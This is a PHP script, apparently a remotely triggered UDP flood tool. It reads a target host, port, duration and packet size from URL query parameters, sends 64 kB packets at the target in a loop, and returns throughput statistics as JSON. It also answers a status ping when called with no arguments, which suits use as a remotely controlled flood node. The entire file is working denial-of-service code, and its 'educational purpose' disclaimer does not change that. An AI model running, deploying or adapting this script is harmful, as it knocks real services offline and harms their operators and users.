<?php

/**
 *
 * Script to perform a DoS UDP Flood
 *
 * @author c0re^
 * @license http://www.gnu.org/licenses/old-licenses/gpl-2.0.txt GPLv2
 *
 * This tool is written on educational purpose, please use it on your own good faith.
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 *
 */

error_reporting(E_ERROR | E_WARNING);

ini_set('max_execution_time', 0);

class DoS {

    /**
     * Target host, e.g. 127.0.0.1
     * @var string
     */
    private $host;

    /**
     * Target port, e.g. 443
     * @var int
     */
    private $port;

    /**
     * Flood time in seconds
     * @var int
     */
    private $time;

    /**
     * Packet size in bytes
     * @var int
     */
    private $size;

    /**
     * DoS constructor.
     * @param $host string Target host
     * @param $port int Target port
     * @param $time int Flood time in Seconds
     * @param $size int Packet size in bytes
     */
    public function __construct($host, $port, $time, $size)
    {
        Preconditions::checkArgument(!filter_var($host, FILTER_VALIDATE_IP), "host missing or incorrect format");
        Preconditions::checkArgument(!filter_var($port, FILTER_VALIDATE_INT), "port incorrect format");
        Preconditions::checkArgument(!filter_var($time, FILTER_VALIDATE_INT), "time missing or incorrect format");
        Preconditions::checkArgument(!filter_var($size, FILTER_VALIDATE_INT), "size incorrect format");

        $this->host = $host;
        $this->port = $port;
        $this->time = $time;
        $this->size = $size;
    }

    /**
     * Starts UPD attack
     * @return int Amount of bytes sent
     * @throws Exception
     */
    public function flood() {
        /** @var string $packet */
        //$packet = openssl_random_pseudo_bytes($this->size);
        $packet = str_repeat("\x00", $this->size);

        /** @var int $startTime */
        $startTime = time();

        /** @var int $endTime */
        $endTime = $startTime + $this->time;

        /** @var resource $socket */
        $socket = @fsockopen("udp://$this->host", $this->port, $errorNumber, $errorMessage, 30);
        if(!$socket) {
            throw new Exception($errorMessage);
        }

        for($packets = 1; time() <= $endTime; ++$packets)
        {
            @fwrite($socket, $packet);
        }
        @fclose($socket);

        return $packets;
    }
}

class Preconditions {

    /**
     * Ensures the truth of an expression involving one or more parameters to the calling method.
     * @param $expression boolean A boolean expression
     * @param $errorMessage string The exception message to use if the check fails
     * @throws InvalidArgumentException If expression is false
     */
    public static function checkArgument($expression, $errorMessage) {
        if($expression) {
            throw new InvalidArgumentException($errorMessage);
        }
    }
}

class Application {

    public static function start($args) {

        if(sizeof($args) === 0) {
            echo json_encode(array("status" => "ok"));
            return;
        }

        $host = $args['host'];
        $port = isset($args['port']) ? $args['port'] : 80;
        $time = $args['time'];
        $size = isset($args['size']) ? $args['size'] : (1024 * 64); // 64 kB

        $result = null;
        try {
            $dos = new DoS($host, $port, $time, $size);
            $packets = $dos->flood();

            $pps = intval($packets / $time);
            $mbps = intval($packets * $size / 1024 / 1024 / $time);
            $result = array("success" => "true", "pps" => $pps, "mbps" => $mbps);
        } catch (Exception $e) {
            $result = array("success" => "false", "error" => $e->getMessage());
        }

        echo json_encode($result);
    }
}

Application::start($_GET);